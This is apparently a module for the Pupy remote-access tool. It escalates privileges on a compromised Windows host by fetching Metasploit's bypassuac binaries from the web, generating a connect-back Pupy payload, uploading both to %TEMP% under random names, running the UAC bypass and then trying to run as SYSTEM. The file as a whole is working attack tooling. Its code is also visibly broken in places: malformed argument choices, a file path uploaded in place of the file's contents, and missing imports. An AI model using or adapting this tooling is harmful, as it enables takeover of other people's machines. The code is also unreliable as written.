# -*- coding: UTF8 -*-
from pupylib.PupyModule import *
import urllib
from memory_exec import MemoryExec

__class_name__="GetPrivsModule"

class GetPrivsModule(PupyModule):
	""" try to get SeDebugPrivilege for the current process """

	def init_argparse(self):
		self.arg_parser = PupyArgumentParser(prog="getprivs", description=self.__doc__)
		self.arg_parser.add_argument('-e','--pupy', help='Use an alternative file', completer=path_completer)
		self.arg_parser.add_argument('-m','--method', choices=['binary,reflective'], required=True, help='UAC bypass method')

	@windows_only
	def is_compatible(self):
		pass

	def run(self, args):
		if not os.path.isdir("./tools"):
			self.error("./tools folder not found...")
			os.makedirs("./tools")
			if not os.path.exists("/tools/bypassuac*"):
				self.error("bypassuac files not found...")
				bypass_file=["bypassuac-x64.exe","bypassuac-x86.exe","bypassuac-x64.dll","bypassuac-x86.dll"]
				for bin in bypass_file:
					bypassuac=urllib.request.urlopen('https://github.com/rapid7/metasploit-framework/blob/master/data/post/'+bin+'?raw=true')
					f = open(bin,'wb')
					f.write(bypassuac.read())
					f.close()

		exebuff=b""
		if args.pupy:
			with open(args.pupy,'rb') as f:
				exebuff=f.read()
			self.info("loading %s ..."%args.pupy)
		else:
			#retrieving conn info
			res=self.client.conn.modules['pupy'].get_connect_back_host()
			host, port=res.rsplit(':',1)
			#generating exe
			self.info("generating exe ...")
			if self.client.desc['proc_arch']=="64bit":
				exebuff=pupygen.get_edit_pupyx64_exe(host, port, self.client.pupsrv.transport)
			else:
				exebuff=pupygen.get_edit_pupyx86_exe(host, port, self.client.pupsrv.transport)

		self.client.load_package("pupwinutils.security", force=True)

		AdminCheck = self.client.conn.modules["pupwinutils.security"].AdminCheck()
		UACLevelCheck = self.client.conn.modules["pupwinutils.security"].UACLevelCheck()

		win_old = ['7','Server 2008']
		win_new = ['8','Server 2012','10']

		if AdminCheck==False:
			if UACLevelCheck in range(1,4):
				self.error("UAC set to always notify, unable to bypassUAC")
			elif UACLevelCheck==5:
				self.info("UAC set to default, attempting to bypassUAC")
				try:
					self.error("User is not admin, trying bypass UAC...")
					if args.method=="reflective":
						if self.client.desc['proc_arch']=="64bit":
							MemoryExec.args.path = b"./tools/bypassuac-x64.dll"
						else:
							MemoryExec.args.path = b"./tools/bypassuac-x86.dll"
							self.error("reflective elevation is work in progress, please use binary elevation, exiting...")

					if args.method=="binary":
						if self.client.desc['proc_arch']=="64bit":
							bpuacbuff = b"./tools/bypassuac-x64.exe"
						else:
							bpuacbuff = b"./tools/bypassuac-x86.exe"

						remote_path = {'bypass':'','pupy':''}
						for i in remote_path:
							####file upload:
							remote_path[i]=self.client.conn.modules['os.path'].expandvars("%TEMP%\\{}.exe".format(''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])))
							self.info("uploading to %s ..."%remote_path[i])
							#uploading
							rf=self.client.conn.builtin.open(remote_path[i], "wb")
							chunk_size=16000
							pos=0
							while True:
								buf=bpuacbuff[pos:pos+chunk_size] if i == 0 else exebuff[pos:pos+chunk_size]
								if not buf:
									break
								rf.write(buf)
								pos+=chunk_size
							rf.close()
							self.success("upload successful")

						self.client.conn.modules["pupwinutils.security"].ByPassUAC(remote_path['bypass'], remote_path['pupy'])

					self.success("User is admin, can elevate privilages to SYSTEM !")
					try:
						self.client.conn.modules["pupwinutils.security"].RunAsSystem()
						self.success("Stuff enabled !")
					except:
						self.error("Could not run as SYSTEM...")
				except:
					self.error("Could not elevate privilages to ADMIN")
			elif UACLevelCheck==0:
				self.info("UAC set to DoNotPrompt - use ShellExecute method instead")

		self.info("Running as: ",self.client.conn.modules["pupwinutils.security"].RunAsSystem().GetUserName())

